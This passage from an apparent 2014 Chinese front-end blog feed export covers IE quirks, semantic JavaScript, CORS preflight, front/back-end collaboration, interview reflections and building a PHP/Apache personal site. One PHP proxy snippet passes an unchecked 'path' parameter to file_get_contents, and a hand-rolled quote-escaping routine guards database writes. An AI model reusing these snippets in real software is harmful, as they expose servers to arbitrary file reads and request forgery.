      </tags>
  </entry>
  <entry>
    <title><![CDATA[评《别太听上司的话》]]></title>
    <url>%2Fblog%2F2014%2F08%2F29%2F2014-08-29-be-patient%2F</url>
    <content type="text"><![CDATA[今天早上逛博客园，看到了一篇吐槽的文章：别太听上司的话，有些感触： 给你加任务的，可以称之为需求方。在需求方看来，无论你是前端开发还是后台开发，广义上讲，都是资源，有需求当然也是需要资源的。 每一个需求过来都应该进行评审，需求方不提，你自己也没有提出来，他们觉得加一点东西或者改一点东西是十分轻松的事情，因为他们不懂技术，可是你懂呀，你需要把排期和难点罗列出来，给出一个相对准确的项目时间，这有啥难度么？ 能力强不等于无敌，有些人会说能力越强责任越重，你可以认为这是忽悠你的借口，不过这也是事实，当你的技术能力和业务能力持平之后，你的工资和职衔也就上去了。 你说一两年学到的东西还不如两个月的，显然，你指的是技术方面。想必楼主是一个沉醉于技术的人，但是在工作中，技术只是一方面，或许学会做人才是最重要的。 我也经常会遭遇楼主这样的经历，每每过来都是忍气吞声，但是每一次我都试着去坦然去面对，当然提高了自己跟人 PK 的能力。 所以，加油吧！]]></content>
      <categories>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>life</tag>
        <tag>work</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE下title没有childNodes]]></title>
    <url>%2Fblog%2F2014%2F08%2F21%2F2014-08-21-IE-bug-in-title-element%2F</url>
    <content type="text"><![CDATA[问题： IE 8下 document.getElementsByTagName(‘title’)[0].firstChild为毛是null啊 而document.getElementsByTagName(‘title’)[0].innerHTML却有值，给title赋值却报错。 按照 w3c 的解释，title 元素下有且只有一个 text node，除 IE 外，其他浏览器都能正确打印 getTagName(“title”).item(0).childNodes == 1; 而 IE 他不认为 title 元素有 childNode，你可以当他是没有实现规范的 bug。IE9+ 修复了这个问题。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>IEbug</tag>
        <tag>firstChild</tag>
        <tag>childNodes</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何让你的JavaScript代码更加语义化]]></title>
    <url>%2Fblog%2F2014%2F08%2F20%2F2014-08-20-cb-javascript-semantization%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 语义化这个词在 HTML 中用的比较多，即根据内容的结构化选择合适的标签。其作用不容小觑：赋予标签含义，让代码结构更加清晰，虽然我们可以在标签上添加 class 来标识，但这种通过属性来表示本体的形式会显得不够直接，而且在一定程度上也有冗余。优化搜索引擎（SEO），结构良好的网页对搜索引擎的亲和力是很高的，百度和 google 也给出了很多网页结构化的建议（规范），方便他们抓取网页。利于设备解析，如盲人阅读器对页面的分析，目前淘宝很多网页都是支持盲人阅读的，这种体验上的优化得利于网页的良好结构和语义化表达。便于开发者维护，在参加工作之前，很多程序员都是单人开发模式，单人开发无所谓代码结构，自己看得懂就差不多了，一旦走向工作岗位，会发现，以前的鄙习有点让自己捉襟见肘了。W3C Group 工作组在 web 规范上持续贡献，他们的目标也是期望整个互联网的发展态势稳定统一起来。不扯远了，回到本文需要阐述的重点：如何语义化 JavaScript 代码？一、先看看那些不易读懂的 JavaScript 代码1. 判断 123456789// 数据类型判断if(Object.prototype.toString.call(str) === &quot;[object String]&quot;)&#123; // doSomething();&#125;；// 文件类型判断if(/.*\.css(?=\?|$)/.test(\/path/to/main.css&quot;))&#123; // doSomething();&#125; 2. 清空一个队列 1234var Queue = [&quot;test1&quot;, &quot;test2&quot;, &quot;test3&quot;];// 常见方式Queue.length = 0;Queue = []; 3. 注册一个变量 123456789101112// 注册var repos = &#123;&#125;;repos[&quot;a&quot;] = &#123; name: &quot;a&quot;, content: &#123;&#125;&#125;;repos[&quot;b&quot;] = &#123; name: &quot;b&quot;, content: &#123;&#125;&#125;; 上面几个例子倒不至于看不懂，程序都特别简单，第一个例子中，我们通过 Object 原型链上的 toString 方法来判断一个变量是否为 string 类型，以及使用正则来判断一个文件是不是 css 文件。代码写起来比较轻松，倘若我们同时需要判断多个对象是否为多个类型中的一种呢？再比如我们需要在一串代码中提取 require 依赖关系呢，是否应该思考下如何组织自己的代码？在第二个例子中，将数组的长度设置为 0，或者使用空数组来重置这个变量，都是十分常见的方式，但目前的场景是清空一个队列，我们是否可以使用更加语义化的形式来呈现？比如我们只需要清空该队列的前五个和后三个 item 呢？第三个例子中，变量的注册，把一堆注册放在一起，上面的形式确实也是一目了然，如果 a b c d 等都是分隔穿插在几百行代码之间呢？突然来个 repos[“x”] 这样是否显得有些不太直观。为了说明本文所倡导的思想，上面的几个解释都有些含糊和牵强，请往下看。二、提高代码语义性针对上述三个案例，用更加语义化的方式来呈现代码：1. 语义化变量 1234567891011121314// 类型判断function isType(type)&#123; return function(o)&#123; return Object.prototype.toString.call(o) === &apos;[object &apos; + type + &apos;]&apos;; &#125;&#125;var isString = isType(&quot;String&quot;);var isObject = isType(&quot;Object&quot;);var isArray = isType(&quot;Array&quot;);isString(&quot;I&apos;m Barret Lee.&quot;);isArray([1,2,3])；isObject(&#123;&#125;); 我觉得不需要太多的解释，对比 123if(Object.prototype.toString.call(str) === &quot;[object String]&quot;)&#123; // code here...&#125; 显得清新多了吧。 123// 提取常量var isCss = /.*\.css(?=\?|$)/;isCss.test(&quot;/path/to/main.css&quot;); 不管 isCss 这个正则代码有多长，当我们看到 isCss 这个单词就可以顾名思义。很多人写正则都不会将正则单独提取出来使用某个有意义的变量去存储，加注释还好，要是不加注释，后续开发者就只能硬着头皮看懂正则去理解代码的含义。这样的处理，实际上是增加了代码量，不过从工程角度去审视，有助于提高开发效率以及代码的组织性。2. 语义化行为 12var Queue = [&quot;test1&quot;, &quot;test2&quot;, &quot;test3&quot;];Queue.splice(0, Queue.length); 上面代码具有很强的语义性，从索引为 0 的地方开始，直到队列最后，删除 Queue 中所有的 item。这种写法的扩展性也更好： 1Queue.splice(2, 4); // 删除从索引为 2，往后的 4 个元素 这只是个小例子，有些行为是需要很多代码组合处理的，如果没有很好的组合同一行为的代码，整个结构就显得十分涣散，不利于阅读。 1234567891011// 注册var repos = [];function register(o)&#123; repos[o.name] = o;&#125;register(&#123; name: &quot;a&quot;, content: &#123;&#125;&#125;); 对比我们之前 1234repos[&quot;a&quot;] = &#123; name: &quot;a&quot;, content: &#123;&#125;&#125;; 语义化程度是不是有所提高~三、小结代码的优化，需要考虑的维度很多。但是代码的优化并不是减少代码量，有的时候我们需要增加代码来提高代码的可阅读性。正确标记变量封装某个动作注意函数的写法不容易理解的东西，加注释本文为抛砖引玉，希望可以触发你对代码优化的敏感度的思考，写出一手别人竖拇指的代码~&nbsp;]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[POST请求失败，变成options请求]]></title>
    <url>%2Fblog%2F2014%2F08%2F19%2F2014-08-19-post-method-change-to-options%2F</url>
    <content type="text"><![CDATA[问题： 我的 XMLHttpRequest 跨域 POST ，怎么请求方式自动由POST变成OPTIONS了呢？ 浏览器为了安全起见，会先发送一个 options 请求，确保请求发送是安全的，一般 POST DELETE PUT 等请求都会修改服务器资源，所以浏览器会先发一个请求，问问服务器是否会正确（允许）请求。 出现 OPTIONS 的情况一般为： 非 GET | POST 请求 POST 请求的 content-type 不是常规的那三个 POST 请求的 payload 为 text/xml 我的请求倒是很常规啊，不存在上面3条的问题 跨域了呀，浏览器也会为了试探服务器是否会接受请求，先发送一个 options 请求。即便是服务器允许程序跨域访问，若不支持 options 请求，请求也会死掉。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>跨域</tag>
        <tag>ajax</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[绝对定位，margin:0 auto，让元素竖直居中]]></title>
    <url>%2Fblog%2F2014%2F08%2F07%2F2014-08-07-position-and-margin%2F</url>
    <content type="text"><![CDATA[问题： div { margin: auto; position: absolute; top: 0; left: 0; right: 0 bottom: 0; width: 100px; height: 100px; } 是如何自适应的。 原因是，绝对定位的布局取决于三个因素，一个是元素的位置，一个是元素的尺寸，一个是元素的margin值。 没有设置尺寸和 margin 的元素会自适应剩余空间，位置固定则分配尺寸，尺寸固定边会分配 margin，都是自适应的。 IE7- 的渲染方式不同，渲染规则也不一样，他不会让定位元素去自适应。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Object + Array]]></title>
    <url>%2Fblog%2F2014%2F08%2F07%2F2014-08-07-%7B%7D%2B%5B%5D%2F</url>
    <content type="text"><![CDATA[问题： {} + [] {} + [] 结果应该是 0 console.log({} + []) 结果应该是 object object 两个 {} 的语义不一样,前者被解析成 {}; +[]; 后者 {} 为对象. 操作符，针对非 Number 的处理内部调用 ToPrimary() 函数, {} 和 [] 都执行了自身的 toString 函数 ({} + []) ({}) + [] 这些表达式中，{}都被当做对象来解析，而不是 作用块]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谈谈前后端的分工协作]]></title>
    <url>%2Fblog%2F2014%2F08%2F03%2F2014-08-03-cb-interface-in-development%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 前后端分工协作是一个老生常谈的大话题，很多公司都在尝试用工程化的方式去提升前后端之间交流的效率，降低沟通成本，并且也开发了大量的工具。但是几乎没有一种方式是令双方都很满意的。事实上，也不可能让所有人都满意。根本原因还是前后端之间的交集不够大，交流的核心往往只限于接口及接口往外扩散的一部分。这也是为什么很多公司在招聘的时候希望前端人员熟练掌握一门后台语言，后端同学了解前端的相关知识。一、开发流程前端切完图，处理好接口信息，接着就是把静态demo交给后台去拼接，这是一般的流程。这种流程存在很多的缺陷。后端同学对文件进行拆分拼接的时候，由于对前端知识不熟悉，可能会搞出一堆bug，到最后又需要前端同学帮助分析原因，而前端同学又不是特别了解后端使用的模板，造成尴尬的局面。如果前端没有使用统一化的文件夹结构，并且静态资源（如图片，css，js等）没有剥离出来放到 CDN，而是使用相对路径去引用，当后端同学需要对静态资源作相关配置时，又得修改各个link，script标签的src属性，容易出错。接口问题后端数据没有准备好，前端需要自己模拟一套，成本高，如果后期接口有改变，自己模拟的那套数据又不行了。后端数据已经开发好，接口也准备好了，本地需要代理线上数据进行测试。这里有两个费神的地方，一是需要代理，否则可能跨域，二是接口信息如果改动，后期接你项目的人需要改你的代码，麻烦。不方便控制输出。为了让首屏加载速度快一点，我们期望后端先吐出一点数据，剩下的才去 ajax 渲染，但让后端吐出多少数据，我们不好控。当然，存在的问题远不止上面枚举的这些，这种传统的方式实在是不酷（Kimi 附身^_^）。还有一种开发流程，SPA（single page application），前后端职责相当清晰，后端给我接口，我全部用 ajax 异步请求，这种方式，在现代浏览器中可以使用 PJAX 稍微提高体验，Facebook 早在三四年前对这种 SPA 的模式提出了一套解决方案，quickling+bigpipe，解决了 SEO 以及数据吐出过慢的问题。他的缺点也是十分明显的：页面太重，前端渲染工作量也大首屏还是慢前后端模板复用不了SEO 依然很狗血（quickling 架构成本高）history 管理麻烦问题多的已经是无力吐槽了，当然他依然有自己的优势，咱们也不能一票否决。针对上面看到的问题，现在也有一些团队在尝试前后端之间加一个中间层（比如淘宝UED的 MidWay ）。这个中间层由前端来控制。 1234567891011+----------------+| F2E |+---↑--------↑---+ | |+---↓--------↓---+| Middle |+---↑--------↑---+ | |+---↓--------↓---+| R2E |+----------------+ 中间层的作用就是为了更好的控制数据的输出，如果用MVC模型去分析这个接口，R2E（后端）只负责 M（数据） 这部分，Middle（中间层）处理数据的呈现（包括 V 和 C）。淘宝UED有很多类似的文章，这里不赘述。二、核心问题上面提出了在业务中看到的常见的三种模式，问题的核心就是数据交给谁去处理。数据交给后台处理，这是模式一，数据交给前端处理，这是模式二，数据交给前端分层处理，这是模式三。三种模式没有优劣之分，其使用还是得看具体场景。既然都是数据的问题，数据从哪里来？这个问题又回到了接口。接口文档由谁来撰写和维护？接口信息的改动如何向前后端传递？如何根据接口规范拿到前后端可用的测试数据？使用哪种接口？JSON，JSONP？JSONP 的安全性问题如何处理？这一系列的问题一直困扰着奋战在前线的前端工程师和后端开发者。淘宝团队做了两套接口文档的维护工具，IMS以及DIP，不知道有没有对外开放，两个东西都是基于 JSON Schema 的一个尝试，各有优劣。JSON Schema 是对 JSON 的一个规范，类似我们在数据库中创建表一样，对每个字段做一些限制，这里也是一样的原理，可以对字段进行描述，设置类型，限制字段属性等。接口文档这个事情，使用 JSON Schema 可以自动化生产，所以只需编写 JSON Schema 而不存在维护问题，在写好的 Schema 中多加些限制性的参数，我们就可以直接根据 Schema 生成 mock（测试） 数据。mock 数据的外部调用，这倒是很好处理： 123typeof callback === &quot;function&quot; &amp;&amp; callback(&#123; json: &quot;jsonContent&quot;&#125;) 在请求的参数中加入 callback 参数，如 /mock/hashString?cb=callback，一般的 io(ajax) 库都对异步数据获取做了封装，我们在测试的时候使用 jsonp，回头上线，将 dataType 改成 json 就行了。 12345IO(&#123; url: &quot;http://barretlee.com&quot;, dataType: &quot;jsonp&quot;, //json success: function()&#123;&#125;&#125;) 这里略微麻烦的是 POST 方法，jsonp 只能使用 get 方式插入 script 节点去请求数据，但是 POST，只能呵呵了。这里的处理也有多重方式可以参考：修改 Hosts，让 mock 的域名指向开发域名mock 设置 header 响应头，Access-Allow-Origin-Control对于如何拿到跨域的接口信息，我也给出几个参考方案：fiddler 替换包，好像是支持正则的，感兴趣的可以研究下（求分享研究结果，因为我没找到正则的设置位置）使用 HTTPX 或者其他代理工具，原理和 fiddler 类似，不过可视化效果（体验）要好很多，毕竟人家是专门做代理用的。自己写一段脚本代理，也就是本地开一个代理服务器，这里需要考虑端口的占用问题。其实我不推荐监听端口，一个比较不错的方案是本地请求全部指向一个脚本文件，然后脚本转发URL，如：12345原始请求：http://barretlee.com/api/test.json在ajax请求的时候：$.ajax(&#123; url: &quot;http://&lt;local&gt;/api.php?path=/api/text.json&quot;&#125;);php中处理就比较简单啦： 12345if(!isset($_GET[&quot;page&quot;]))&#123; echo 0; exit();&#125;echo file_get_contents($_GET[&quot;path&quot;]); Ctrl+S,保存把线上的接口数据到本地的api文件夹吧-_-|| 三、小结 本文只是对前后端协作存在的问题和现有的几种常见模式做了简要的列举，JSON Schema 具体如何去运用，还有接口的维护问题、接口信息的获取问题没有具体阐述，这个后续有时间会整理下我对他的理解。]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习和面试，这两件事儿]]></title>
    <url>%2Fblog%2F2014%2F08%2F01%2F2014-08-01-cb-thinking-between-learning-and-interview%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 上个月（六月份）博客闲置了一月，在学校处理毕业相关事宜。本月仅做了一点建站笔记，几乎没怎么来园子逛。许久没写博，突然回到这个熟悉的后台，感觉十分亲切。我喜欢分享自己的喜悦，沉醉于跟大家一起讨论的技术氛围之中，这两年的沉淀也是在大家的切磋和争吵声中偶尔聆听的。大四一年时间里，我分别在百度和阿里两家公司实习了三个月，目前已经正式就职于淘宝UED，忆实习的两段经历，感慨颇多呀~近期有好几个朋友问我两个问题：想去BAT，怎么去学习呀？百度、阿里面试（电面居多）都问些什么问题？在我进入两家公司之前，这两个问题也一直困扰着我，当时我心里只有一个念头，\拼命学吧，到时候比旁边的人优秀一丁点就OK了。” 事实证明，这个念头也是有效的&nbsp;: )这个想法可以扎根在每个人的心里，不过能坚持学习，每天都逼着自己进步的人，少之又少。我当时学的挺辛苦的，各种技术书籍，啃了两百多本，光前端的就有一百多本（部分书单），像比较经典的书籍会一遍两遍甚至十遍的去读，如《JavaScript权威指南》、《JavaScript设计模式》等，也不知道当时哪来这股子热劲^_^。学校图书馆资源丰富，加上我比较关注书店IT空间的新书，所以大三一年的阅读量是十分惊人的。技术学习，并不一定要一个十分明确的方向，就拿前端来说，要成为前端大拿，至少要对设计模式、HTTP协议、后端脚本以及前沿的技术了然于胸，多学一些，前期虽看不到效果，等你沉淀多了，眼界开了，自然就不一样了。前端核心无非就是HTML+CSS+JavaScript，他们的边界很宽。内涵小的东西，外延往往很宽，前端也是如此。现在的面试感觉实的东西并不多，短短半个多小时的闲聊很难了解一个人的真实底蕴（除非你确实很烂），技术性问题就跟公式一样，背一背就知道答案了。公司招人往往喜欢那些口齿伶俐、思路清晰、斩钉截铁的人，我们90后的反应普遍都是比较快的，但是在反应的这一瞬间里，脑子里转了多个弯，分析了多少种情况，面试官都会从问答过程中摸索结果，所以保持乐观，保持清晰的头脑，保持谦逊的态度，很重要。关于学习，底层再底层思考，打破砂锅问到底，这是我的学习方法。公司上班之后，可支配的时间少了，不能说学习的时间少了，在公司这个环境中，我们学到更多的不一定是技术，还有人和人之间的交往，也有职场的潜规则。技术学习和技术分享需要持之以恒，希望以后可以做到这点！]]></content>
      <categories>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[个人网站架构设计(三) - 从设计到前端到后台]]></title>
    <url>%2Fblog%2F2014%2F07%2F04%2F2014-07-04-cb-personal-website-design-part-3%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 网站地址：http://barretlee.com在五月份，写过两篇博客，提到了要给自己做个网站，当时人在实习，没太多的时间，只是把大概的思路捋了一番，顺道也买了个云主机（配置比较低，内存才500M）。接着返校处理毕业事宜，于是六月也随着同学之间挥泪告别的声音渐渐远去。七月，家里呆着，中旬回公司。想必这也是我近几年最长的一次假期了=。 =一、先说设计1. 阮一峰的博客目前我的博客设计是 fork 了 BeiYuu 的主题，然后七改八改，除了主页 BeiYuu 还认得出是他的之外，其他页面已经动了很大的手术，而这些手术灵感都是源自阮一峰阮大大（我的博客地址是&lt;barretlee.com&gt;，正文部分基本是抄袭他的设计，虽然代码是我重新敲的…）。阮教授自2003年开始经营他的博客ruanyifeng.com，到目前为止已有十一载，期间肯定也是改版了N次。在多次的改版之后，整个网站，结构上，几乎没有太多的冗余，内容上，更不用说，每一篇都是深入浅出、鞭辟入里，绝对可以给32个赞，想表达的内容全部十分清晰地呈现给了读者，阮大大的文字功底，我辈望尘莫及。他的博客涉及面广，而且网站的设计上也是花够了心思，在观察他的博客设计时，想到了一些问题。读者进入页面，他最关注的是什么？通过什么方式来突出文章的重点和亮点？网站主页展示哪些元素？如何去表述一个比较新的技术点或者观点？自己的鄙见我就不发表了，不过上面提到的几个问题都是值得去思考的。2. 张鑫旭的博客张鑫旭大哥，也是通过博客认识的，后来才发现，我与他同是华中科技大学[校友]，再后来又发现，我竟然与他是同一个技术团队（学校&middot;网络应用研发中心）的成员[队友]，再后来还发现，我竟然早就跟他在同一个群里[朋友]。很多人提到张鑫旭的博客，都说\就是那个喜欢张含韵的人的博客啦”，我倒是问过他，他说测试图片前几张正好是张含韵，顺手选中拿出来。。他的博客也是十分有特色的：专注点很集中 - 前端，而且是小而美的研究，很赞文风 - 很能扯淡，喜欢的人竖拇指，不喜欢的人觉得罗里吧嗦思考的两个问题：如何让别人一眼发现，\哦，这是那个xxx的博客”？博客先是记录自己，然后变成服务他人。3. 简书简书的口号就是\找回文字的力量”，我不太喜欢文字（基本没看过小说），所以没有仔细品味简书里面的东西，但却对他网站视觉的设计很感兴趣。简洁大方，有书的味道，整个体验很有质感。我是个程序猿，不算射鸡湿。如果文章呈现的内容太多，我会hold不住整体的布局，所以会比较中意简洁的设计，简洁的另一个好处就是突出正文，内容很直观的被呈现出来。以上我列举了三个网站，不用想，肯定又会去抄他们了，囧。。。但其实我参考的网站有十几个，把十几个网站（我觉得）突出的地方整合进了自己的设计，请不要喷我这个不懂设计的程序猿。二、从设计到前端实现正常的流程是设计-&gt;设计稿-&gt;切图，我跳过了设计稿，直接开始敲代码，貌似自己对代码的亲切度比PSD图片更高（所以为什么总说撸代码呢…）。设计很简单，故意弱化设计以强化内容，希望能够取长补短。1. 正文的设计与实现正文的设计参考了简书，但是简书是一个以文字为中心的网站，图片都很少出现。而对于一个博客来说，有几个元素十分重要：代码、引用块、图片、表格、list列表等等。所以这些元素的展示要自己来设计。细节上的东西，只要进入网站就能看到，所以在这里就不赘述太多。代码的高亮使用的是 prettify 的 light 主题，对它做了微调。代码块滚动条的样式也修改了下： 12345678pre::-webkit-scrollbar &#123;width:10px;height:10px;background:#F6F6F6;border-top:1px solid #CCC;padding-top:1px;&#125;pre::-webkit-scrollbar-thumb &#123;background:#EEE;border-radius:5px;border:1px solid #CCC;border-bottom:0px;&#125;pre::-webkit-scrollbar-thumb:hover &#123;background:#DDD;&#125;pre::-webkit-scrollbar &#123;width:10px;height:10px;background:#CCC;&#125;pre::-webkit-scrollbar-thumb &#123;background:#999;border-radius:5px;&#125;pre::-webkit-scrollbar-thumb:hover &#123;background:#666;&#125;pre::-webkit-scrollbar-corner &#123;background:#CCC;&#125;pre::-webkit-color-swatch &#123;border:none;&#125; 效果是这样的：整个设计都是扁平化，没有圆角，看起来感觉还算舒服，下面是引用块的样式呈现：由于一些代码是可以直接运行的，所以也给可运行代码加上了一个运行的 button：在IE下，是使用一个 about:blank 的空白页打开代码文件，如果浏览器支持 blob 流，将会使用 blob 流打开： 123456789if (!operation.isIE()) &#123; window.open(URL.createObjectURL(new Blob([code], &#123; type: &quot;text/html; charset=UTF-8&quot; &#125;)));&#125; else &#123; var d = window.open(&quot;about:blank&quot;).document; d.write(code); d.close();&#125; 2. 侧边栏的设计与实现 1) 侧边栏-未展开从上图可以看到，侧边栏都是一些功能按钮，从上往下依次是：显示隐藏文章目录，页面主题和字体设置，关于作者，反馈信息，RSS订阅。为啥要搞个侧边栏，还放那么多的功能按钮？就拿司徒正美的博客来说，我在群里吐槽了他博客风格好几次（被骂回来了…理由是每个人审美观不一样），你可以去瞅瞅他的页面，代码字体实在是太小了，每次看他的博客都会把字号和行高调大一点，后来直接写个脚本放在收藏夹，进入他的网页一键处理。这个例子说明，每个人的口味不一样。一个网站，倘若冷暖色调，字体大小等可以自定义的话就更棒了，我没做那么复杂，就是给文章加了个黑色主题。通过这个按钮可以进行相应的设置。然后是侧边栏下面的几个按钮：\跟我对话”点击之后会在右下角往上蹦出一个浮层：这个浮层是可拖动的。2) 侧边栏-展开做了个未展开的侧边栏其实也差不多了，后来发现我的页面中好像并没有\文章归档”，\最新文章”，\最近评论”等这些对一个博客来说很常见的元素，于是乎，抄袭了下豆瓣FM的设计，弄了下面的东西：这块效果还挺难做的，主要是滚动不好处理。左侧是一个 fixed 定位，容器的高度是死的，也就是 $(window).height() 的高度，blabla.. 细节我不说了，如果你感兴趣可以去思考下如何实现类似豆瓣FM左侧的功能块。我后来是监听鼠标滚动设置负margi-top值来模拟页面滚动。并且这个监听是在整个 document 而不是仅仅是 左侧的 box 上。整体效果实现并不复杂，麻烦的是一些细节处理。2. 底部的设计与实现底部的设计我最纠结的是内容，到底放点什么东西。跟文章相关度最高的，一是相关文章，二是评论，所以也就只把这两样放上了。三、后台设计和数据库开始想过后台用 wordpress 或者其他的框架系统来构建，但是这些东西提供的接口比较冗余，而且功能复杂，没有全盘研究过他们的源码，最后决定自己写一套后端框架以及前后端接口，工作量立马就上去了… 我也是想趁此机会回顾下 php 和 mysql 的知识，太久不用都生疏了。1. 旧博客写入数据库以前的博客都是使用 Markdown 语法写的，Markdown 的优点就是简洁清晰，但是在解析的时候总是会有这样那样的问题，并且很多 Markdown 解析工具都不支持给元素添加 id 或者 class，这让人很纠结。所以存入数据的文章已经解析成 HTML 了。Github pages 支持 jekyll 语法，jekyll 允许使用 Markdown，使用 jekyll 语法写的文章内容中多了很多 对头部的解析也没啥好办法，就是使用正则来匹配： 123456$html = file_get_contents($path);$reg = &quot;/---\n\s*layout:\s*[\s\S]+?\ntitle:\s*(?&lt;title&gt;[\s\S]+?)\n&quot; . &quot;description:\s*(?&lt;description&gt;[\s\S]+?)\ncategory:\s*&quot; . &quot;(?&lt;category&gt;[\s\S]+?)\n(tags:\s*(?&lt;tags&gt;[\s\S]+?)\n)?---\n(?&lt;content&gt;[\s\S]+)/&quot;;preg_match_all($reg, $html, $match); 由于文章并没有集中放在一个文件夹，写了个遍历文件夹的 travel 函数： 123456789101112131415function traverse($path = &apos;.&apos;) &#123; $current_dir = opendir($path); while(($file = readdir($current_dir)) !== false) &#123; $sub_dir = $path . DIRECTORY_SEPARATOR . $file; if($file == &apos;.&apos; || $file == &apos;..&apos;) &#123; continue; &#125; else if(is_dir($sub_dir)) &#123; //echo &apos;Directory &apos; . $file . &apos;:&lt;br&gt;&apos;; traverse($sub_dir); &#125; else &#123; //echo &apos;File in Directory &apos; . $path . &apos;: &apos; . $file . &apos;&lt;br&gt;&apos;; dealFile($path . DIRECTORY_SEPARATOR . $file); &#125; &#125;&#125; 这里需要注意的是，存入数据库之前要处理一些单双引号/UTF-16字符，否则存入的时候会出错。 12345function remSpecialChars($string) &#123; $string = stripslashes($string); $string = preg_replace(&quot;/&apos;/&quot;,&quot;&lt;#039;&quot;,$string); $string = preg_replace(&apos;/&quot;/&apos;,&apos;&lt;quot;&apos;,$string); return $string; 取出的时候还原单双引号： 123456function addSpecialChars($string) &#123; // $string = htmlspecialchars($string); $string = preg_replace(&quot;/&lt;#039;/&quot;,&quot;&apos;&quot;,$string); $string = preg_replace(&apos;/&lt;quot;/&apos;,&apos;&quot;&apos;,$string); return $string;&#125; 2. 网页各个模块的处理 网页中，正文、底部和边栏需要数据，所以数据的查询主要是针对这三块。目前这三块数据是后台直接同时输出的，稍微想想就知道这个效率并不高，后续肯定会改成异步接口。封装之后，获取并渲染一篇文章就变得异常轻松了： 12345678include &apos;page.class.php&apos;;$page = new PageInitor();# 正文内容$post = $page-&gt;getPageByTitleEn($_GET[&apos;title&apos;]);# 底部和侧边内容$otherData = $page-&gt;getPostOtherData(); 后台数据的渲染都是：如果改成前端异步获取，那前端又得写一套模板渲染数据，这里感觉流程上存在冗余，后期肯定会改进。3. 内容的解析文章内容的编写还是使用Markdown，尽管他在某些地方不能满足我的需求。内容的解析使用的是 michelf 的 php-markdown 开源框架： 12$cotent = file_get_contents($path);$html = Markdown::defaultTransform($content); 使用起来也是十分方便，但是上面的函数只能解析一些基础的 Markdown 格式，诸如图片、表格等解析不出来。这需要引入： 123456# Get Markdown classuse \Michelf\Markdown;use \Michelf\MarkdownExtra;# 然后使用MarkdownExtra::defaultTransform($content) 使用 MarkdownExtra 的类来解析， MarkdownExtra 是继承 \Michelf_MarkdownExtra_TmpImpl 的。四、服务器的设置和维护目前使用 apache 作为服务器已经够用了，需要缓存的页面也并不多，就是几个列表页和搜索页，所以这方面可以采用技术成熟的 memcache 来处理，只不过后期在同一台服务器上会搭建多个网站，每个网站对应的域名不一样，并且有些网站的后台会使用 nodeJS 来编写，所以还是需要 Nginx 来配置 Virtual Host，Apache 也可以实现 Vhost 的配置，我在本地测试的时候就是使用的 apache 的 Vhost，这里也简单说说 vhost 的配置。1. apache 的 vhost 配置配置步骤如下：在 httpd.conf 中开启 vhost 模块，并 include 其配置文件 httpd-vhosts.conf在 httpd-vhosts.conf 写入123456789101112131415161718# 这是配置 localhost 这个&quot;域名&quot;&lt;virtualhost *:80=&quot;&quot;&gt; ServerAdmin i@localhost DocumentRoot &quot;E:/wamp/www&quot; ServerName localhost ServerAlias localhost ErrorLog &quot;logs/localhost.log&quot; CustomLog &quot;logs/localhost-access.log&quot; common&lt;/virtualhost&gt;# 这是配置 test.barretlee.com 这个域名&lt;virtualhost *:80=&quot;&quot;&gt; ServerAdmin test@barretlee.com DocumentRoot &quot;E:/wamp/www/barretlee&quot; ServerName test.barretlee.com ErrorLog &quot;logs/test.barretlee.com-error.log&quot; CustomLog &quot;logs/test.barretlee.com-access.log&quot; common&lt;/virtualhost&gt;因为网上对这方面的配置有详细说明，我也不是行家，就不细说了。2. Rewrite模块其实就是网页的静态化，我们看到的php页面是： 1/index.php?id=23 但是我们更希望通过这种方式来获取页面： 1/index.php/23 URL 需要进行重写，算是内部重定向吧。这方面的工作可以交给 Nginx 来处理，也可以交给 Apache，由于我本地目前还只配置了 Apache，所以先看看 Apache 的配置方式：1) 使用了Vhost 123456789101112131415161718&lt;virtualhost *:80=&quot;&quot;&gt; ServerAdmin test@barretlee.com DocumentRoot &quot;E:/wamp/www/barretlee&quot; ServerName test.barretlee.com ErrorLog &quot;logs/test.barretlee.com-error.log&quot; CustomLog &quot;logs/test.barretlee.com-access.log&quot; common &lt;directory e:\wamp\www\barretlee=&quot;&quot;&gt; Options FollowSymLinks AllowOverride None Order deny,allow Allow from all RewriteEngine on RewriteRule ^blog/(\d+)/(\d+)/(.*).html$ index.php?title=$3&lt;year=$1&lt;month=$2 RewriteRule ^static/(.*)$ static/$1 &lt;/directory&gt;&lt;/virtualhost&gt; 如果使用了 Vhost，可以在配置里写上 RewriteEngine on，然后加上需要的 RewriteRule 规则就行了。2) 没有使用 Vhost在网页所在文件的根目录下，新建一个 .htaccess 文件，里头写上： 1234RewriteEngine onRewriteBase /barretleeRewriteRule ^blog/(\d+)/(\d+)/(.*).html$ index.php?title=$3&lt;year=$1&lt;month=$2RewriteRule ^static/(.*)$ static/$1 重定向的内容就行了。第二种方式会存在一个问题，如果你的资源请求在 /barretlee 的上一层或者上几层，那么这里的正则就会匹配不到了，所以建议使用 Vhost 来配置自己的 